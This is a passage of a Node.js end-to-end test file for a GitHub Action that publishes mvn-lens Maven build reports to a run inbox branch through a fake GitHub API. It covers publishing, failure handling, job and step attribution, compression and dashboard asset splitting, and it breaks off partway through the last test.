/*
 * Copyright (c) The mvn-perf Authors.
 * Licensed under the Apache License, Version 2.0.
 *
 * End-to-end tests of the `report` action against the fake GitHub: the action
 * runs in-process through run({ fetch, sleep }) with the environment a runner
 * would provide, plus one spawn of report/index.js against fake.serve().
 */
'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const { run, keyFor, reportLabels, describeFailure } = require('../src/report');
const { GitStoreError } = require('../src/gitstore');
const { compressReportHtml, splitReportHtml } = require('../src/mvnlens');
const { createFakeGitHub } = require('./fake-github');
const { tmpDir, fakeReportHtml, fakeShellReportHtml, fixtureModel, fakeRun, withEnv, captureOutputs } = require('./helpers');

const ROOT = path.join(__dirname, '..');
const REPO = 'acme/widgets';
const RUN_ID = 777;
const JOB_ID = 7770;
const TOKEN = 'ghs_s3cretT0kenValueXYZ';
const INBOX = `build-monitor-inbox/${RUN_ID}`;
const SITE = 'https://acme.github.io/widgets/';
/** The job started 100 s ago; the Maven step ran from +6 s to +90 s, the report step is running now. */
const BASE = Date.now() - 100000;
const REPORT_WRITTEN_AT = BASE + 60000;
const fastSleep = () => new Promise(r => setImmediate(r));

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** A run with one in-progress build job (this one) and a completed lint job. */
function scenario(extra) {
  const runObj = fakeRun({
    id: RUN_ID, baseMs: BASE, status: 'in_progress', repository: REPO, jobs: [
      { id: JOB_ID, name: 'build', runnerName: 'GitHub Actions 7', steps: [
        { number: 1, name: 'Set up job', start: 2, end: 4 },
        { number: 2, name: 'Run actions/checkout@v4', start: 4, end: 6 },
        { number: 3, name: 'Build with Maven', start: 6, end: 90 },
        { number: 4, name: 'Publish mvn-lens report', start: 90, end: 95, status: 'in_progress' },
      ] },
      { id: JOB_ID + 1, name: 'lint', runnerName: 'GitHub Actions 8', status: 'completed', steps: [
        { number: 1, name: 'Set up job', start: 2, end: 4 },
        { number: 2, name: 'Lint', start: 4, end: 20 },
      ] },
    ],
  });
  return createFakeGitHub(Object.assign({ repository: REPO, runs: [runObj] }, extra || {}));
}

/** The runner environment of the build job; null unsets a variable (CI leaks its own GITHUB_* otherwise). */
function actionEnv(cap, extra) {
  const env = {
    GITHUB_REPOSITORY: REPO, GITHUB_RUN_ID: String(RUN_ID), GITHUB_RUN_NUMBER: '42', GITHUB_RUN_ATTEMPT: '1',
    GITHUB_JOB: 'build', RUNNER_NAME: 'GitHub Actions 7', GITHUB_SERVER_URL: 'https://github.com', GITHUB_API_URL: 'https://api.github.com',
    GITHUB_WORKFLOW_REF: 'acme/widgets/.github/workflows/ci.yml@refs/heads/main', GITHUB_WORKFLOW: 'CI', GITHUB_EVENT_PATH: null, GITHUB_TOKEN: null,
    // On a real runner GITHUB_ACTIONS=true makes addMask print "::add-mask::<token>" (by design); the leak checks below must not see it.
    GITHUB_ACTIONS: null, RUNNER_DEBUG: null, BUILD_MONITOR_DEBUG: null,
    'INPUT_GITHUB-TOKEN': TOKEN, INPUT_GITHUB_TOKEN: null, INPUT_REPORT: null, 'INPUT_STEP-NAME': null, INPUT_STEP_NAME: null,
    'INPUT_JOB-NAME': null, INPUT_JOB_NAME: null, INPUT_LABEL: null, 'INPUT_INBOX-PREFIX': null, INPUT_INBOX_PREFIX: null,
    'INPUT_SITE-URL': null, INPUT_SITE_URL: null, INPUT_COMPRESS: null, 'INPUT_IF-NO-FILES-FOUND': null, INPUT_IF_NO_FILES_FOUND: null,
    'INPUT_FAIL-ON-ERROR': null, INPUT_FAIL_ON_ERROR: null, 'INPUT_COMMIT-MESSAGE': null, INPUT_COMMIT_MESSAGE: null,
  };
  return Object.assign(env, cap ? cap.env : {}, extra || {});
}

/** A workspace holding target/mvnlens/report.html written during the Maven step. */
function workspace(model, htmlOpts) {
  const dir = tmpDir('report');
  const file = writeReport(path.join(dir, 'target', 'mvnlens', 'report.html'), model, htmlOpts);
  return { dir, file };
}

function writeReport(file, model, htmlOpts, writtenAt) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, fakeReportHtml(model || fixtureModel(), Object.assign({ pako: true }, htmlOpts || {})));
  const t = (writtenAt || REPORT_WRITTEN_AT) / 1000;
  fs.utimesSync(file, t, t);
  return file;
}

/** A workspace whose report carries the real six-block shell — the one splitReportHtml lifts out. */
function shellWorkspace(model) {
  const dir = tmpDir('report');
  const file = path.join(dir, 'target', 'mvnlens', 'report.html');
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, fakeShellReportHtml(model || fixtureModel()));
  const t = REPORT_WRITTEN_AT / 1000;
  fs.utimesSync(file, t, t);
  return { dir, file };
}

async function inDir(dir, fn) {
  const prev = process.cwd();
  process.chdir(dir);
  try { return await fn(); } finally { process.chdir(prev); }
}

/** Runs the action in-process from `dir` with the given env overrides; returns { res, out, summary, stdout }. */
async function runReport(fake, dir, envExtra, opts) {
  const cap = captureOutputs();
  const chunks = [];
  const write = process.stdout.write;
  process.stdout.write = (chunk, enc, cb) => { chunks.push(String(chunk)); if (typeof enc === 'function') enc(); else if (cb) cb(); return true; };
  let res;
  try {
    res = await inDir(dir, () => withEnv(actionEnv(cap, envExtra), () => run(Object.assign({ fetch: fake.fetch, sleep: fastSleep }, opts || {}))));
  } finally {
    process.stdout.write = write;
  }
  return { res, out: cap.outputs(), summary: cap.summary(), stdout: chunks.join('') };
}

/** Asynchronous spawn (the fake HTTP server lives in this process: a spawnSync would block it). */
function spawnNode(args, opts) {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, args, Object.assign({}, opts, { stdio: ['ignore', 'pipe', 'pipe'] }));
    let stdout = '';
    let stderr = '';
    child.stdout.setEncoding('utf8');
    child.stderr.setEncoding('utf8');
    child.stdout.on('data', d => { stdout += d; });
    child.stderr.on('data', d => { stderr += d; });
    const timer = setTimeout(() => child.kill(), 120000);
    child.on('error', reject);
    child.on('close', status => { clearTimeout(timer); resolve({ status, stdout, stderr }); });
  });
}

function inboxFile(fake, p) { return fake.store.readFile(INBOX, p); }
function inboxMeta(fake, key) { return JSON.parse(String(inboxFile(fake, `reports/${RUN_ID}/${key}/meta.json`))); }

// ---------------------------------------------------------------------------
// Happy path
// ---------------------------------------------------------------------------

test('publishes the compressed report and meta.json to the run inbox ref; outputs and summary', async () => {
  const fake = scenario();
  const ws = workspace();
  const { res, out, summary, stdout } = await runReport(fake, ws.dir);

  assert.equal(res.exitCode, 0, stdout);
  const head = fake.store.headOf(INBOX);
  assert.ok(head, 'refs/heads/build-monitor-inbox/777 was created');
  assert.deepEqual(fake.store.listDir(INBOX, `reports/${RUN_ID}/j${JOB_ID}-s3`), ['meta.json', 'report.html']);
  const html = String(inboxFile(fake, `reports/${RUN_ID}/j${JOB_ID}-s3/report.html`));
  assert.match(html, /<script id="mvnlens-data" type="application\/json">gzip:/, 'the model block is gzip+base64');
  assert.ok(html.length < fs.statSync(ws.file).size, 'smaller than the original');

  const meta = inboxMeta(fake, `j${JOB_ID}-s3`);
  assert.equal(meta.schemaVersion, 1);
  assert.equal(meta.repository, REPO);
  assert.equal(meta.serverUrl, 'https://github.com');
  assert.equal(meta.runId, RUN_ID);
  assert.equal(meta.runNumber, 42);
  assert.equal(meta.runAttempt, 1);
  assert.equal(meta.workflowRef, 'acme/widgets/.github/workflows/ci.yml@refs/heads/main');
  assert.equal(meta.jobKey, 'build');
  assert.equal(meta.jobId, JOB_ID);
  assert.equal(meta.jobName, 'build');
  assert.equal(meta.jobUrl, `https://github.com/${REPO}/actions/runs/${RUN_ID}/job/${JOB_ID}`);
  assert.equal(meta.runnerName, 'GitHub Actions 7');
  assert.equal(meta.stepNumber, 3);
  assert.equal(meta.stepName, 'Build with Maven');
  assert.equal(meta.stepResolution, 'runner/report-time');
  assert.equal(meta.label, null);
  assert.equal(meta.key, `j${JOB_ID}-s3`);
  assert.ok(Date.parse(meta.collectedAt) > Date.now() - 60000);
  assert.equal(meta.reports.length, 1);
  const rep = meta.reports[0];
  assert.equal(rep.file, 'report.html');
  assert.equal(rep.originalPath, 'target/mvnlens/report.html');
  assert.equal(rep.label, null);
  assert.equal(rep.summarySource, 'html');
  assert.equal(rep.compressed, true);
  assert.equal(rep.bytes, Buffer.byteLength(html));
  assert.equal(rep.summary.totalMs, 7975);
  assert.equal(rep.summary.modules, undefined, 'modules are dropped from the summary');
  assert.ok(rep.summary.moduleCount >= 1);

  assert.equal(out.found, 'true');
  assert.equal(out.published, 'true');
  assert.equal(out.key, `j${JOB_ID}-s3`);
  assert.equal(out['report-path'], `reports/${RUN_ID}/j${JOB_ID}-s3/report.html`);
  assert.equal(out['monitor-url'], `${SITE}#/run/${RUN_ID}`);
  assert.equal(out['report-url'], `${SITE}#/report/${RUN_ID}/j${JOB_ID}-s3`);
  assert.equal(out['job-id'], String(JOB_ID));
  assert.equal(out['step-name'], 'Build with Maven');
  assert.equal(out['maven-total-ms'], '7975');
  assert.equal(out['commit-sha'], head);
  assert.equal(out.reason, '');
  assert.deepEqual(res.outputs, out);

  assert.match(summary, /^## 🔎 To go further: a more in-depth report, available a few minutes after this summary\r?\n/, 'the way to go further opens the summary, as a heading');
  assert.match(summary, /\n### mvn-lens report — build › Build with Maven\r?\n\r?\n\*\*Duration 8\.0 s\*\* · 7\.6 s after extensions init/);
  assert.match(summary, /Maven `clean verify` · ✅ OK · org\.mvnlens\.it:it04-multi-module:1\.0-SNAPSHOT · Maven 3\.9\.16 · JDK 17\.0\.8\.1/);
  assert.ok(summary.includes('| CPU | Threads | Surefire JVMs | Slowest goal | GC pause | C2 compile | Slowest test |'), summary);
  assert.ok(summary.includes('<summary><b>Module wall time</b> · 5 modules</summary>'), summary);
  assert.ok(summary.replace(/\r\n/g, '\n').includes(`- 📊 **[This report](${SITE}#/report/${RUN_ID}/j${JOB_ID}-s3)** — the full mvn-lens report of this Maven build: timeline, tests, CPU, memory, GC, JIT and flame graphs\n- 🏃 **[This run](${SITE}#/run/${RUN_ID})** — every Maven build of this workflow run\n- 📚 **[All mvn-lens reports](${SITE}#/reports)** — the history kept on the monitoring page\n\n**Monitoring page: [${SITE}](${SITE})**  \n`), summary);
  assert.ok(summary.includes('_This summary was written as the build ended; the Build monitor workflow processes the run once it completes, then GitHub Pages publishes the page — a few minutes later._'), summary);

  const commit = fake.store.commit(head);
  assert.equal(commit.message, 'Add mvn-lens report: build › Build with Maven');
  assert.deepEqual(commit.parents, []);
  assert.equal(commit.author.name, 'github-actions[bot]');
  assert.ok(!stdout.includes('::warning::'), stdout);
  assert.match(stdout, /re-encoded as gzip\+base64/);
});

test('a second run with identical content publishes nothing new: same commit sha, still published', async () => {
  const fake = scenario();
  const ws = workspace();
  const first = await runReport(fake, ws.dir);
  const head = fake.store.headOf(INBOX);
  const second = await runReport(fake, ws.dir);
  assert.equal(second.res.exitCode, 0);
  assert.equal(second.out.published, 'true');
  assert.equal(second.out.key, first.out.key);
  assert.equal(second.out['commit-sha'], head);
  assert.equal(fake.store.headOf(INBOX), head, 'no new commit');
  assert.equal(fake.store.commitsOf(INBOX).length, 1);
  assert.match(second.stdout, /already up to date/);
  const blobPosts = fake.calls.filter(c => c.method === 'POST' && c.path.endsWith('/git/blobs'));
  assert.equal(blobPosts.length, 2, 'report.html and meta.json were uploaded once, by the first run');
});

test('same key with different content: the key gets a -2 suffix and a warning', async () => {
  const fake = scenario();
  const ws = workspace();
  const first = await runReport(fake, ws.dir);
  assert.equal(first.out.key, `j${JOB_ID}-s3`);
  const model = fixtureModel();
  model.session.totalMs = 9999;
  writeReport(ws.file, model);
  const second = await runReport(fake, ws.dir);
  assert.equal(second.res.exitCode, 0);
  assert.equal(second.out.published, 'true');
  assert.equal(second.out.key, `j${JOB_ID}-s3-2`);
  assert.equal(second.out['report-path'], `reports/${RUN_ID}/j${JOB_ID}-s3-2/report.html`);
  assert.equal(second.out['report-url'], `${SITE}#/report/${RUN_ID}/j${JOB_ID}-s3-2`);
  assert.match(second.stdout, /::warning::.*already exists in the inbox.*using key j7770-s3-2/);
  assert.deepEqual(fake.store.listDir(INBOX, `reports/${RUN_ID}`), [`j${JOB_ID}-s3`, `j${JOB_ID}-s3-2`]);
  assert.equal(inboxMeta(fake, `j${JOB_ID}-s3-2`).reports[0].summary.totalMs, 9999);
  assert.equal(inboxMeta(fake, `j${JOB_ID}-s3`).reports[0].summary.totalMs, 7975, 'the first set is untouched');
  assert.equal(fake.store.commitsOf(INBOX).length, 2);

  // A third, again different report → -3 (the head is re-read each time).
  model.session.totalMs = 1234;
  writeReport(ws.file, model);
  const third = await runReport(fake, ws.dir);
  assert.equal(third.out.key, `j${JOB_ID}-s3-3`);
});

test('the inbox of a run can hold reports from several jobs; each commit builds on the previous head', async () => {
  const fake = scenario();
  fake.store.seedBranch(INBOX, { [`reports/${RUN_ID}/j1-s2/report.html`]: '<html>other job</html>', [`reports/${RUN_ID}/j1-s2/meta.json`]: '{}' });
  const before = fake.store.headOf(INBOX);
  const ws = workspace();
  const { res, out } = await runReport(fake, ws.dir);
  assert.equal(res.exitCode, 0);
  assert.equal(out.published, 'true');
  assert.deepEqual(fake.store.listDir(INBOX, `reports/${RUN_ID}`), ['j1-s2', `j${JOB_ID}-s3`]);
  assert.deepEqual(fake.store.commit(out['commit-sha']).parents, [before]);
});

// ---------------------------------------------------------------------------
// Failure policy
// ---------------------------------------------------------------------------

test('read-only token (fork pull request): warning with the permission hint, published=false, exit 0; fail-on-error → exit 1', async () => {
  const fake = scenario({ readOnly: true });
  const ws = workspace();
  const { res, out, summary, stdout } = await runReport(fake, ws.dir);
  assert.equal(res.exitCode, 0);
  assert.equal(out.found, 'true');
  assert.equal(out.published, 'false');
  assert.match(out.reason, /contents: write/);
  assert.match(out.reason, /Resource not accessible by integration/);
  assert.match(out.reason, /forks/);
  assert.equal(out.key, `j${JOB_ID}-s3`, 'the key was computed (job and step were located through the read API)');
  assert.equal(out['job-id'], String(JOB_ID));
  assert.equal(out['commit-sha'], '');
  assert.equal(out['monitor-url'], `${SITE}#/run/${RUN_ID}`, 'the monitoring link is still printed');
  assert.match(stdout, /::warning::.*not published.*contents: write/);
  assert.ok(!stdout.includes('::error::'));
  assert.match(summary, /^## ⚠️ This report was not published\r?\n/, 'the reason opens the summary, as a heading');
  assert.match(summary, /\n### mvn-lens report — build › Build with Maven\r?\n/);
  assert.match(summary, /\*\*Duration 8\.0 s\*\*/, 'the Overview is local data: written even when nothing was published');
  assert.match(summary, /## ⚠️ This report was not published\r?\n\r?\n\*\*Reason:\*\* the token cannot write to the repository \(.*\); grant contents: write to this job \(pull requests from forks have a read-only token\)\. {2}\r?\nIt will not appear on the monitoring page \[https:\/\/acme\.github\.io\/widgets\/\]\(https:\/\/acme\.github\.io\/widgets\/\)\./);
  assert.ok(!summary.includes('[this report]('), 'no viewer link for an unpublished report');
  assert.ok(!summary.includes('To go further'), summary);
  assert.equal(fake.store.headOf(INBOX), null);

  const strict = await runReport(fake, ws.dir, { 'INPUT_FAIL-ON-ERROR': 'true' });
  assert.equal(strict.res.exitCode, 1);
  assert.equal(strict.out.published, 'false');
  assert.match(strict.stdout, /::error::.*contents: write/);
});

test('no report: if-no-files-found warn (exit 0) / error (exit 1) / ignore (exit 0); found=false, no summary', async () => {
  const fake = scenario();
  const dir = tmpDir('empty');
  const warn = await runReport(fake, dir);
  assert.equal(warn.res.exitCode, 0);
  assert.equal(warn.out.found, 'false');
  assert.equal(warn.out.published, 'false');
  assert.match(warn.out.reason, /no mvn-lens report found for target\/mvnlens\/report\.html/);
  assert.equal(warn.out.key, '');
  assert.match(warn.stdout, /::warning::.*no mvn-lens report found/);
  assert.equal(warn.summary, '');

  const err = await runReport(fake, dir, { 'INPUT_IF-NO-FILES-FOUND': 'error', INPUT_REPORT: 'nowhere/*.html' });
  assert.equal(err.res.exitCode, 1);
  assert.equal(err.out.found, 'false');
  assert.match(err.stdout, /::error::.*no mvn-lens report found for nowhere\/\*\.html/);

  const ignore = await runReport(fake, dir, { 'INPUT_IF-NO-FILES-FOUND': 'ignore' });
  assert.equal(ignore.res.exitCode, 0);
  assert.equal(ignore.out.found, 'false');
  assert.ok(!ignore.stdout.includes('::warning::') && !ignore.stdout.includes('::error::'), ignore.stdout);
  assert.equal(fake.calls.length, 0, 'no API request without a report');
  assert.equal(fake.store.headOf(INBOX), null);
});

test('a matched file without an embedded mvn-lens model is not published', async () => {
  const fake = scenario();
  const dir = tmpDir('nomodel');
  fs.mkdirSync(path.join(dir, 'target', 'mvnlens'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'target', 'mvnlens', 'report.html'), '<html><body>not a report</body></html>');
  const { res, out, stdout } = await runReport(fake, dir);
  assert.equal(res.exitCode, 0);
  assert.equal(out.found, 'false');
  assert.equal(out.published, 'false');
  assert.match(out.reason, /none embeds an mvn-lens model/);
  assert.match(stdout, /::warning::.*no embedded mvn-lens model/);
  assert.equal(fake.store.headOf(INBOX), null);
});

test('rate limit exhaustion and a lost CAS budget map to their reasons (exit 0, or 1 with fail-on-error)', async () => {
  const limited = scenario({ rateLimit: { times: 1000 } });
  const ws = workspace();
  const rl = await runReport(limited, ws.dir, null, { apiOptions: { maxRateLimitWaits: 0 } });
  assert.equal(rl.res.exitCode, 0);
  assert.equal(rl.out.found, 'true');
  assert.equal(rl.out.published, 'false');
  assert.equal(rl.out.reason, 'GitHub API rate limited');
  assert.match(rl.stdout, /::warning::.*rate limited/);

  const busy = scenario();
  busy.store.seedBranch(INBOX, { [`reports/${RUN_ID}/j1-s2/meta.json`]: '{}' });
  let races = 0;
  busy.hook(({ method, path: p }) => {
    if (method === 'PATCH' && p.includes('/git/refs/')) { races++; busy.store.seedBranch(INBOX, { [`racer-${races}.txt`]: String(races) }); }
  });
  const cas = await runReport(busy, ws.dir, null, { budgetMs: 1 });
  assert.equal(cas.res.exitCode, 0);
  assert.equal(cas.out.published, 'false');
  assert.equal(cas.out.reason, 'could not commit within the time budget');
  assert.ok(races >= 1, 'at least one ref update raced');
  assert.equal(busy.store.readFile(INBOX, `reports/${RUN_ID}/j${JOB_ID}-s3/report.html`), null);

  const strict = await runReport(busy, ws.dir, { 'INPUT_FAIL-ON-ERROR': 'true' }, { budgetMs: 1 });
  assert.equal(strict.res.exitCode, 1);
  assert.match(strict.stdout, /::error::.*could not commit within the time budget/);
});

test('an invalid inbox-prefix is reported as a reason (warning; error with fail-on-error), never thrown', async () => {
  const fake = scenario();
  const ws = workspace();
  const { res, out } = await runReport(fake, ws.dir, { 'INPUT_INBOX-PREFIX': 'bad prefix' });
  assert.equal(res.exitCode, 0);
  assert.equal(out.found, 'true');
  assert.equal(out.published, 'false');
  assert.match(out.reason, /inbox-prefix/);
  const strict = await runReport(fake, ws.dir, { 'INPUT_INBOX-PREFIX': 'bad prefix', 'INPUT_FAIL-ON-ERROR': 'true' });
  assert.equal(strict.res.exitCode, 1);
});

test('outside a workflow run (no GITHUB_REPOSITORY / GITHUB_RUN_ID): found, not published, clear reason, exit 0', async () => {
  const fake = scenario();
  const ws = workspace();
  const { res, out, stdout } = await runReport(fake, ws.dir, { GITHUB_REPOSITORY: null, GITHUB_RUN_ID: null, 'INPUT_FAIL-ON-ERROR': 'true' });
  assert.equal(res.exitCode, 0, 'a local run is not a failure even with fail-on-error');
  assert.equal(out.found, 'true');
  assert.equal(out.published, 'false');
  assert.match(out.reason, /GITHUB_REPOSITORY \/ GITHUB_RUN_ID/);
  assert.equal(out['maven-total-ms'], '7975');
  assert.equal(out['monitor-url'], '');
  assert.equal(out.key, '');
  assert.equal(fake.calls.length, 0);
  assert.match(stdout, /Maven clean verify/);
  assert.ok(!stdout.includes('::error::'));

  const noToken = await runReport(fake, ws.dir, { 'INPUT_GITHUB-TOKEN': '' });
  assert.equal(noToken.res.exitCode, 0);
  assert.equal(noToken.out.published, 'false');
  assert.match(noToken.out.reason, /github-token is empty/);
  assert.match(noToken.stdout, /::warning::/);
});

// ---------------------------------------------------------------------------
// Attribution, labels, options
// ---------------------------------------------------------------------------

test('attribution: explicit job-name (+ step-name), runner name, and an unresolved job → "<job key>-<random>" key', async () => {
  const fake = scenario();
  const ws = workspace();

  const byName = await runReport(fake, ws.dir, { RUNNER_NAME: 'somewhere else', GITHUB_JOB: 'zzz', 'INPUT_JOB-NAME': 'build', 'INPUT_STEP-NAME': 'Build with Maven' });
  assert.equal(byName.out.key, `j${JOB_ID}-s3`);
  assert.equal(inboxMeta(fake, `j${JOB_ID}-s3`).stepResolution, 'job-name/step-name');
  assert.equal(byName.out['step-name'], 'Build with Maven');

  const byRunner = await runReport(fake, ws.dir, { GITHUB_JOB: 'zzz', INPUT_LABEL: 'runner' });
  assert.equal(byRunner.out.key, `j${JOB_ID}-s3-runner`);
  assert.equal(inboxMeta(fake, `j${JOB_ID}-s3-runner`).stepResolution, 'runner/report-time');

  const byKey = await runReport(fake, ws.dir, { RUNNER_NAME: 'somewhere else', INPUT_LABEL: 'key' });
  assert.equal(byKey.out.key, `j${JOB_ID}-s3-key`);
  assert.equal(inboxMeta(fake, `j${JOB_ID}-s3-key`).stepResolution, 'job-key/report-time');

  const lost = await runReport(fake, ws.dir, { RUNNER_NAME: 'somewhere else', GITHUB_JOB: 'Java (25)', 'INPUT_STEP-NAME': 'Build with Maven' });
  assert.equal(lost.res.exitCode, 0);
  assert.equal(lost.out.published, 'true', 'an unattributed report is still published');
  assert.match(lost.out.key, /^Java-25-[0-9a-z]{6}$/, lost.out.key);
  assert.equal(lost.out['job-id'], '');
  assert.equal(lost.out['step-name'], 'Build with Maven', 'the step-name input is echoed even when unresolved');
  const meta = inboxMeta(fake, lost.out.key);
  assert.equal(meta.jobId, null);
  assert.equal(meta.jobName, null);
  assert.equal(meta.jobKey, 'Java (25)');
  assert.equal(meta.stepNumber, null);
  assert.equal(meta.stepName, 'Build with Maven');
  assert.equal(meta.stepResolution, 'job-not-found');
  assert.match(lost.stdout, /::warning::.*could not identify this job/);
  assert.match(lost.summary, /\n### mvn-lens report — Java \(25\) › Build with Maven\r?\n/);
  assert.equal(fake.store.commit(lost.out['commit-sha']).message, 'Add mvn-lens report: Java (25) › Build with Maven');
});

test('attribution: a report written in the last second of the Maven step goes to Maven, not to the step starting there', async () => {
  // assertj run 33402133042, job "Kotlin 2.1.21": "Test" 14:32:57 → 14:34:37 (Maven), then "Publish the
  // mvn-lens build report" 14:34:37 → 14:34:44. mvn-lens writes report.html as the Maven session ends
  // (mtime 14:34:36.8) and the Jobs API truncates timestamps to whole seconds, so the *next* step's
  // started_at is already before the mtime.
  const base = Math.floor((Date.now() - 200000) / 1000) * 1000;   // second-aligned, as the API serves them
  const fake = createFakeGitHub({ repository: REPO, runs: [fakeRun({
    id: RUN_ID, baseMs: base, status: 'in_progress', repository: REPO, jobs: [
      { id: JOB_ID, name: 'build', runnerName: 'GitHub Actions 7', steps: [
        { number: 1, name: 'Set up job', start: 2, end: 4 },
        { number: 2, name: 'Run actions/checkout@v5', start: 4, end: 6 },
        { number: 3, name: 'Build', start: 6, end: 20 },
        { number: 4, name: 'Test', start: 20, end: 120 },
        { number: 5, name: 'Publish the mvn-lens build report', start: 120, end: 127, status: 'in_progress' },
      ] },
    ],
  })] });
  const dir = tmpDir('report');
  writeReport(path.join(dir, 'target', 'mvnlens', 'report.html'), null, null, base + 119800);

  const { res, out, stdout } = await runReport(fake, dir);
  assert.equal(res.exitCode, 0, stdout);
  assert.equal(out.published, 'true');
  assert.equal(out.key, `j${JOB_ID}-s4`, 'the Maven step number, not the publish step');
  assert.equal(out['step-name'], 'Test');
  assert.equal(out['report-path'], `reports/${RUN_ID}/j${JOB_ID}-s4/report.html`);
  const meta = inboxMeta(fake, `j${JOB_ID}-s4`);
  assert.equal(meta.stepNumber, 4);
  assert.equal(meta.stepName, 'Test');
  assert.equal(meta.stepResolution, 'runner/report-time');
  assert.match(out['report-url'], new RegExp(`#/report/${RUN_ID}/j${JOB_ID}-s4$`));
});

test('label: appended to the key (sanitised) and recorded verbatim in meta.json', async () => {
  const fake = scenario();
  const ws = workspace();
  const { out } = await runReport(fake, ws.dir, { INPUT_LABEL: 'integration tests' });
  assert.equal(out.key, `j${JOB_ID}-s3-integration-tests`);
  assert.equal(out['report-url'], `${SITE}#/report/${RUN_ID}/j${JOB_ID}-s3-integration-tests`);
  const meta = inboxMeta(fake, out.key);
  assert.equal(meta.label, 'integration tests');
  assert.equal(meta.key, out.key);
});

test('several matches: report.html + report-2.html in one key with distinguishing labels; extra files never move the key', async () => {
  const fake = scenario();
  const dir = tmpDir('multi');
  writeReport(path.join(dir, 'core', 'target', 'mvnlens', 'report.html'));
  const m2 = fixtureModel();
  m2.session.totalMs = 4242;
  writeReport(path.join(dir, 'web', 'target', 'mvnlens', 'report.html'), m2);
  const { res, out, summary } = await runReport(fake, dir, { INPUT_REPORT: '**/target/mvnlens/report.html' });
  assert.equal(res.exitCode, 0);
  assert.equal(out.published, 'true');
  assert.equal(out.key, `j${JOB_ID}-s3`);
  assert.equal(out['maven-total-ms'], '7975', 'the first match is the primary report');
  assert.deepEqual(fake.store.listDir(INBOX, `reports/${RUN_ID}/j${JOB_ID}-s3`), ['meta.json', 'report-2.html', 'report.html']);
  const meta = inboxMeta(fake, `j${JOB_ID}-s3`);
  assert.deepEqual(meta.reports.map(r => [r.file, r.originalPath, r.label, r.summary.totalMs]), [
    ['report.html', 'core/target/mvnlens/report.html', 'core', 7975],
    ['report-2.html', 'web/target/mvnlens/report.html', 'web', 4242],
  ]);
  assert.match(summary, /\n### mvn-lens report — build › Build with Maven · core\r?\n/);
  assert.match(summary, /\n### mvn-lens report — build › Build with Maven · web\r?\n/);
  assert.equal((summary.match(/\*\*Duration /g) || []).length, 2, 'one Overview per report');
  assert.match(summary, /\*\*Duration 4\.2 s\*\*/, 'the second report has its own numbers');
  assert.match(summary, /^## 🔎 To go further: more in-depth reports, available a few minutes after this summary\r?\n/, summary.slice(0, 200));
  assert.ok(summary.includes(`- 📊 **[These reports](${SITE}#/report/${RUN_ID}/j${JOB_ID}-s3)** — the full mvn-lens reports of this Maven build`), summary);

  // Comma-separated list, same files → identical set, nothing new.
  const again = await runReport(fake, dir, { INPUT_REPORT: 'core/target/mvnlens/report.html, web/target/mvnlens/report.html' });
  assert.equal(again.out.key, `j${JOB_ID}-s3`);
  assert.equal(again.out['commit-sha'], out['commit-sha']);
});

test('compress: false publishes the original bytes; a report without pako is published as is', async () => {
  const fake = scenario();
  const ws = workspace();
  const plain = await runReport(fake, ws.dir, { INPUT_COMPRESS: 'false' });
  assert.equal(plain.out.published, 'true');
  const stored = inboxFile(fake, `reports/${RUN_ID}/j${JOB_ID}-s3/report.html`);
  assert.ok(Buffer.compare(stored, fs.readFileSync(ws.file)) === 0, 'byte-identical');
  assert.equal(inboxMeta(fake, `j${JOB_ID}-s3`).reports[0].compressed, false);
  assert.match(plain.stdout, /compression disabled/);

  // No pako in the renderer → compressReportHtml declines, the reason is logged, the report is still published.
  const noPako = workspace(null, { pako: false });
  const kept = await runReport(fake, noPako.dir, { INPUT_LABEL: 'nopako' });
  assert.equal(kept.out.published, 'true');
  assert.match(kept.stdout, /not compressed \(renderer has no gzip decoder\)/);
  assert.equal(inboxMeta(fake, `j${JOB_ID}-s3-nopako`).reports[0].compressed, false);
  assert.ok(!String(inboxFile(fake, `reports/${RUN_ID}/j${JOB_ID}-s3-nopako/report.html`)).includes('gzip:'));
});

// ---------------------------------------------------------------------------
// The shared dashboard shell
// ---------------------------------------------------------------------------

test('the dashboard shell is split out beside the report and referenced from it, bootstrap last', async () => {
  const fake = scenario();
  const ws = shellWorkspace();
  const { res, out, stdout } = await runReport(fake, ws.dir);
  assert.equal(res.exitCode, 0, stdout);
  assert.equal(out.published, 'true');
  const dir = `reports/${RUN_ID}/j${JOB_ID}-s3`;
  const names = fake.store.listDir(INBOX, dir);
  const shell = names.filter(n => n.startsWith('lens-'));
  assert.equal(shell.length, 3, `one stylesheet and two scripts: ${names.join(', ')}`);
  // The assets travel INSIDE the key directory: a valid inbox path is exactly
  // reports/<runId>/<key>/<file>, which leaves no room for a root-level one.
  // Lifting them to <site>/assets/ is the processor's job.
  assert.deepEqual(names, shell.concat(['meta.json', 'report.html']));
  for (const n of shell) assert.match(n, /^lens-[0-9a-f]{12}\.(?:js|css)$/, 'the name the processor whitelists');

  // Every reference is '../../../assets/<name>' — from
  // reports/<runId>/<key>/report.html exactly the site root — and the
  // bootstrap, which reads the model with getElementById("mvnlens-data"),
  // still loads AFTER the block it reads.
  const html = String(inboxFile(fake, `${dir}/report.html`));
  const body = n => String(inboxFile(fake, `${dir}/${n}`));
  const at = n => { const i = html.indexOf(`<script src="../../../assets/${n}"></script>`); assert.ok(i >= 0, `${n} is referenced`); return i; };
  const css = shell.find(n => n.endsWith('.css'));
  const app = shell.find(n => body(n).includes('getElementById("mvnlens-data")'));
  const vendor = shell.find(n => n.endsWith('.js') && n !== app);
  const data = html.indexOf('<script id="mvnlens-data" type="application/json">');
  assert.ok(html.includes(`<link rel="stylesheet" href="../../../assets/${css}">`), 'the stylesheet is a <link>');
  assert.ok(html.indexOf(`../../../assets/${css}`) < data, 'the stylesheet loads before the data block');
  assert.ok(at(vendor) < data, 'pako and the other vendor libraries load before the data block');
  assert.ok(at(app) > data, 'the bootstrap still loads AFTER the block it reads by id');
  assert.ok(body(vendor).includes('/*! pako'), 'the vendor bundle');

  // The bytes left the published copy; the file on disk keeps them (it is the CI artifact).
  const original = fs.readFileSync(ws.file, 'utf8');
  assert.ok(Buffer.byteLength(html) * 4 < Buffer.byteLength(original), `${Buffer.byteLength(html)} published of ${Buffer.byteLength(original)}`);
